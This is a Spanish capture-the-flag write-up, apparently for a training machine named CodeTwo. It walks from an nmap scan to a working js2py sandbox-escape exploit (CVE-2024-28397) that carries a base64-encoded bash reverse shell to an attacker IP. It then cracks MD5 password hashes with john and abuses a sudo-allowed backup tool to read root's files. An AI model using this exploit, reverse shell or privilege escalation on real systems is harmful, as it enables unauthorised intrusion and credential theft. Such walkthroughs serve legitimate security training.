

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 08:14 CEST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:14
Completed Parallel DNS resolution of 1 host. at 08:14, 0.02s elapsed
Initiating SYN Stealth Scan at 08:14
Scanning 10.10.11.82 [1000 ports]
Discovered open port 22/tcp on 10.10.11.82
Discovered open port 8000/tcp on 10.10.11.82
Completed SYN Stealth Scan at 08:14, 0.45s elapsed (1000 total ports)
Initiating Service scan at 08:14
Scanning 2 services on 10.10.11.82
Completed Service scan at 08:14, 6.55s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.82.
Initiating NSE at 08:14
Completed NSE at 08:14, 3.33s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.47s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Nmap scan report for 10.10.11.82
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Welcome to CodeTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Initiating NSE at 08:14
Completed NSE at 08:14, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds
           Raw packets sent: 1023 (45.012KB) | Rcvd: 1023 (40.928KB)


```

Vemos que tiene abierto el puerto
+ 22 SSH
+ 8000 gunicorn/20.0.4


si le damos a download app, podemos ver un archivo donde esta la secret key de la app
![[Pasted image 20250827081743.png]]

S3cr3tK3yC0d3Tw0


vemos que si nos logeamos tenemos una ejecucion de codigo por js

![[Pasted image 20250827082624.png]]

podemos ver que en runcode usa js2py, que tiene una vulnerabilidad para bypass del import
CVE-2024-28397

![[Pasted image 20250827084300.png]]

con este conocimiento, podemos hacer el siguiente exploit y meterle un payload

```python
import requests  
import json  
  
url = 'http://10.10.11.82:8000/run_code'  
  
js_code = """  
let cmd = "printf 'KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDkvNDQ0NCAwPiYxKSAm' |base64 -d|bash";
let a = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__;  
let obj = a(a(a,"__class__"), "__base__");  
function findpopen(o) {  
    let result;    for(let i in o.__subclasses__()) {        let item = o.__subclasses__()[i];        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {            return item;        }        if(item.__name__ != "type" && (result = findpopen(item))) {            return result;        }    }}  
let result = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();  
console.log(result);  
result;  
"""  
  
payload = {"code": js_code}  
  
headers = {"Content-Type": "application/json"}  
  
r = requests.post(url, data=json.dumps(payload), headers=headers)  
print("esta es la respuesta:" + r.text)

```

el payload:

```bash
(bash >& /dev/tcp/10.10.14.49/4444 0>&1) &
```

hay que codificarlo en base64.

despues ejecutamos, 

```
nc -nlvp 4444
```

![[Pasted image 20250827094013.png]]

vemos que hay una base de datos


![[Pasted image 20250827101628.png]]

vamos a ver que hay dentro:

vemos que hay usuarios y hashes, vamos a romperlos
![[Pasted image 20250827101658.png]]

con john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
```


![[Pasted image 20250827101734.png]]

vemos que la pass de marco es sweetangelbabylove asi que nos metemos en su cuenta.

![[Pasted image 20250827101834.png]]


## Privesc

vemos que con sudo -l nos sale esto

![[Pasted image 20250827101950.png]]

este es un programa de backups

![[Pasted image 20250827102932.png]]

vemos que esta haciendo un backup de /home/app/app.

vemos que la herramienta tiene una opcion de "DUMP", con la que podemos dumpear y mostrar por pantalla cualquier archivo al que se haya hecho un backup

la idea es hacer un backup de /root ya que lo podemos ejecutar como sudo, y despues dumpear el root.txt

para eso duplicamos el archivo de configuracion y cambiamos el path a /root
![[Pasted image 20250827103145.png]]

ahora ejecutamos

```bash
sudo /usr/local/bin/npbackup-cli -c cp.config --b -f
```


una vez realizado, vamos a ver el archivo

```bash
sudo /usr/local/bin/npbackup-cli -c cp.config -f --dump /root/r
c0eee578bafb0c0c46e2e7eef1f5796f
```


![[Pasted image 20250827103504.png]]
